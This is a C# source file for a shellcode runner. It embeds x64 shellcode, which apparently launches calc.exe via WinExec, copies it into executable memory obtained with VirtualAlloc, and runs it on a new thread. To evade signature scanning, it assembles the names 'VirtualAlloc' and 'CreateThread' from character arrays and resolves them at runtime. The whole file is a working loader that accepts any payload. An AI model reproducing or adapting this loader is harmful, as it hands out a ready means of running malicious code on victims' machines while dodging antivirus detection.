using System;
using System.Runtime.InteropServices;
//using System.Threading;

public class ShellcodeRunner
{
    // Define delegate for CreateThread
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr CreateThreadDelegate(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint INFINITE = 0xFFFFFFFF;

    static readonly byte[] shellcode = new byte[]
    {
0x48,0x83,0xec,0x28,0x48,0x83,0xe4,0xf0,0x48,0x31,
0xc9,0x65,0x48,0x8b,0x41,0x60,0x48,0x8b,0x40,0x18,
0x48,0x8b,0x70,0x10,0x48,0x8b,0x36,0x48,0x8b,0x36,
0x48,0x8b,0x5e,0x30,0x49,0x89,0xd8,0x8b,0x5b,0x3c,
0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,
0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,
0xc2,0x44,0x8b,0x52,0x14,0x4d,0x31,0xdb,0x44,0x8b,
0x5a,0x20,0x4d,0x01,0xc3,0x4c,0x89,0xd1,0x48,0xb8,
0x64,0x64,0x72,0x65,0x73,0x73,0x90,0x90,0x48,0xc1,
0xe0,0x10,0x48,0xc1,0xe8,0x10,0x50,0x48,0xb8,0x47,
0x65,0x74,0x50,0x72,0x6f,0x63,0x41,0x50,0x48,0x89,
0xe0,0x67,0xe3,0x20,0x31,0xdb,0x41,0x8b,0x1c,0x8b,
0x4c,0x01,0xc3,0x48,0xff,0xc9,0x4c,0x8b,0x08,0x4c,
0x39,0x0b,0x75,0xe9,0x44,0x8b,0x48,0x08,0x44,0x39,
0x4b,0x08,0x74,0x03,0x75,0xdd,0xcc,0x51,0x41,0x5f,
0x49,0xff,0xc7,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x1c,
0x4d,0x01,0xc3,0x43,0x8b,0x04,0xbb,0x4c,0x01,0xc0,
0x50,0x41,0x5f,0x4d,0x89,0xfc,0x4c,0x89,0xc7,0x4c,
0x89,0xc1,0x4d,0x89,0xe6,0x48,0x89,0xf9,0xb8,0x61,
0x64,0x90,0x90,0xc1,0xe0,0x10,0xc1,0xe8,0x10,0x50,
0x48,0xb8,0x45,0x78,0x69,0x74,0x54,0x68,0x72,0x65,
0x50,0x48,0x89,0xe2,0x48,0x83,0xec,0x30,0x41,0xff,
0xd6,0x48,0x83,0xc4,0x30,0x49,0x89,0xc5,0x4d,0x89,
0xe6,0x48,0x89,0xf9,0x48,0xb8,0x57,0x69,0x6e,0x45,
0x78,0x65,0x63,0x00,0x50,0x48,0x89,0xe2,0x48,0x83,
0xec,0x30,0x41,0xff,0xd6,0x48,0x83,0xc4,0x30,0x49,
0x89,0xc6,0x48,0x83,0xc4,0x08,0xb8,0x00,0x00,0x00,
0x00,0x50,0x48,0xb8,0x63,0x61,0x6c,0x63,0x2e,0x65,
0x78,0x65,0x50,0x48,0x89,0xe1,0xba,0x01,0x00,0x00,
0x00,0x48,0x83,0xec,0x30,0x41,0xff,0xd6,0x31,0xc9,
0x41,0xff,0xd5
    };

    public static void ExecuteShellcode()
    {

        string[] chars2 = { "V", "i", "r", "t", "u", "a", "l", "A", "l", "l", "o", "c" };
        string funcName2 = string.Concat(chars2);  // "VirtualAlloc"

        IntPtr hModule2 = GetModuleHandle("kernel32.dll");
        IntPtr pFunc2 = GetProcAddress(hModule2, funcName2);

        var VirtualAllocDelly = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(pFunc2);

        // Allocate RWX memory
        IntPtr addr = VirtualAllocDelly(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (addr == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAlloc failed.");
            return;
        }

        // Copy shellcode into memory
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        // Create thread
        uint threadId;

        string[] chars = { "C", "r", "e", "a", "t", "e", "T", "h", "r", "e", "a", "d" };
        string funcName = string.Concat(chars);  // "CreateThread"

        IntPtr hModule = GetModuleHandle("kernel32.dll");
        IntPtr pFunc = GetProcAddress(hModule, funcName);

        var createThreadDelly = Marshal.GetDelegateForFunctionPointer<CreateThreadDelegate>(pFunc);




        IntPtr hThread = createThreadDelly(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("[-] CreateThread failed.");
            return;
        }

        // Wait for thread to finish
        WaitForSingleObject(hThread, INFINITE);
    }
}
